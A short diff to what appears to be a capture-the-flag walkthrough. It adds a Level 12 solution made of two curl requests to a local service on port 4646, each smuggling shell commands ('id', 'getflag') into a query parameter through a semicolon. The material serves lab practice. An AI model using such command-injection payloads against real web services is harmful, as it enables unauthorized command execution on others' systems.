@@ -353,3 +353,6 @@ like below:
     su level06
     # enter the password: the result of getflag stored in level05/flag
 ```
+###Level 12
+curl "http://localhost:4646/?x=;getflag%20y=flag12"
+curl --get --data-urlencode "x=;id;getflag" --data-urlencode "y=flag12" http://localhost:4646
